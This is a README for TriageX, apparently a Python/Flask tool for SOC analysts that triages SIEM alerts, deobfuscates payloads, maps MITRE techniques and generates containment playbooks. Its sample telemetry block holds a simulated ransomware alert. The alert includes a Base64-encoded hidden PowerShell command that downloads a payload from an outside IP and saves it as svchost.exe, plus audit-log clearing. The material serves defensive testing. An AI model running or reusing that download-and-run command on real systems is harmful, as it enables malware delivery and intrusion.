# TriageX
AI-Driven SOC Tier 1 Alert Triage, Static Malware Sandbox &amp; Mini-SOAR Platform built with Python &amp; Flask (VirusTotal, AbuseIPDB, MITRE ATT&amp;CK, Gemini AI).
# 🛡️ TriageX — AI-Driven SOC Tier 1 & Mini-SOAR Platform

![Python](https://img.shields.io/badge/Python-3.10%2B-blue?style=for-the-badge&logo=python)
![Flask](https://img.shields.io/badge/Flask-Web%20Console-000000?style=for-the-badge&logo=flask)
![Platform](https://img.shields.io/badge/Platform-Kali%20Linux%20%7C%20Ubuntu-557C94?style=for-the-badge&logo=kalilinux)
![Role](https://img.shields.io/badge/Blue%20Team-SOC%20Tier%201%20%26%20SOAR-06b6d4?style=for-the-badge)
![MITRE](https://img.shields.io/badge/MITRE%20ATT%26CK-Automated%20Mapping-a855f7?style=for-the-badge)

**TriageX** is a decoupled, enterprise-grade **Alert Triage, Static Malware Sandbox, and Mini-SOAR Console** engineered for **SOC Tier 1 Analysts**. It reduces average SIEM alert investigation time from 15 minutes to under 10 seconds by automating indicator extraction, payload deobfuscation, multi-source Threat Intelligence enrichment, MITRE ATT&CK mapping, and containment playbook generation in a single tactical dark-mode console.

---

## ✨ Key Capabilities & Modules

| Module | Description |
| :--- | :--- |
| **⚡ Smart SIEM Alert Triage** | Ingests raw logs (Splunk, QRadar, Wazuh, Sysmon), separates **Internal/Private Hosts** from **External Adversary IPs**, and computes a dynamic **Threat Risk Score (0–100)**. |
| **🌐 Live Threat Intelligence** | Queries **VirusTotal v3** and **AbuseIPDB v2** APIs in real time for IP reputation, ASN/Geo-IP, abuse confidence scores, and malware family labels. |
| **🔓 Auto-Payload Deobfuscation** | Automatically detects and decodes hidden **PowerShell Base64 (`UTF-16LE`)**, standard Base64, and **URL-encoded** injection payloads without external tools. |
| **🎯 MITRE ATT&CK® Mapper** | Maps log telemetry and Windows/Sysmon Event IDs directly to official **MITRE ATT&CK Techniques** (`T1059.001`, `T1070.001`, `T1110`, `T1543.003`, etc.). |
| **🧠 AI SOC Co-Pilot** | Generates a structured 3-part incident briefing (*Attack Storyline*, *Tier 1 Verification Checklist*, and *Containment Steps*) powered by **Google Gemini AI** with a built-in offline **Neural Heuristic Fallback Engine**. |
| **🔬 Static Malware Sandbox** | Performs safe static analysis on uploaded binaries/documents: calculates **Shannon Entropy** (`0.0–8.0`) for packer detection, inspects **Magic Bytes** for extension spoofing, extracts suspicious **Win32 APIs**, and checks hashes on VirusTotal. |
| **📧 Phishing (`.eml`) Inspector** | Parses email headers (`From` vs `Reply-To` spoofing, `SPF/DKIM/DMARC`), extracts defanged URLs (`hxxp[.]`), and hashes attachments for instant VT verification. |
| **⚡ SOAR Playbook & Webhooks** | Generates copy-ready **Linux (`iptables`)**, **Windows Firewall (`New-NetFirewallRule`)**, and **EDR isolation** commands, plus 1-click alert dispatch to **Discord/Slack SOAR Webhooks**. |
| **📊 Shift Analytics & Handover** | Visualizes shift metrics via **Chart.js**, caches investigated alerts locally to preserve API quota, and exports printable **PDF Incident Reports** & **Shift Handover Summaries**. |

---

## 🏗️ System Architecture

```text
TriageX/
├── soc_shift.py         # Core Engine (Regex Parser, Threat Intel APIs, MITRE Mapper, Static Sandbox, AI Co-Pilot)
├── web_ui.py            # Tactical Web Console (Flask REST API + TailwindCSS Dark SOC UI + Chart.js)
├── requirements.txt     # Python dependencies
└── .env.example         # Template for API keys (VirusTotal, AbuseIPDB, Gemini, Discord Webhook)
```

---

## 🚀 Quick Installation & Setup (Kali Linux / Ubuntu)

### 1. Clone the Repository & Create Virtual Environment
```bash
git clone [https://github.com/YOUR_USERNAME/TriageX.git](https://github.com/YOUR_USERNAME/TriageX.git)
cd TriageX
python3 -m venv venv
source venv/bin/activate
pip install -r requirements.txt
```

### 2. Configure API Keys
Copy the template environment file and add your free API keys:
```bash
cp .env.example .env
nano .env
```

### 3. Launch the Tactical Web Console
```bash
python3 web_ui.py
```
Open your browser and navigate to **`http://127.0.0.1:5000`**.

---

## 🧪 Sample Telemetry for Live Testing

Paste the following simulated ransomware & defense-evasion alert into the **SIEM Alert & SOAR Triage** tab to test all modules simultaneously:

```text
2026-10-15T14:22:10.412Z SIEM-Prod-01: Alert="Critical Ransomware Staging & Defense Evasion"
Host=ACCOUNTS-SRV01.corp.internal PrivateIP=10.20.15.88 User=CORP\svc_backup
EventID=4688 ProcessName="C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
CommandLine="powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUgBpAGwAZQAoACcAaAB0AHQAcAA6AC8ALwAxADgANQAuADIAMgAwAC4AMQAwADEALgAzADQALwBsAG8AYwBrAGIAaQB0AF8AcABhAHkAbABvAGEAZAAuAGUAeABlACcALAAgACcAQwA6AFwAVwBpAG4AZABvAHcAcwBcAFQAZQBtAHAAXABzAHYAYwBoAG8AcwB0AC4AZQB4AGUAIgApAA=="
EventID=7045 ServiceName="WinDefendUpdate" ServiceFileName="C:\Windows\Temp\svchost.exe"
Sysmon_EventID=1 FileHash_SHA256=ed01ebfbc9eb5bbea545af4d01bf5f1071661840480439c6e5babe8e080e41aa
EventID=1102 Security Audit Log Cleared by CORP\svc_backup
```

---

## 📜 License
Released under the **MIT License**. Designed for defensive security operations, Blue Team training, and academic research.
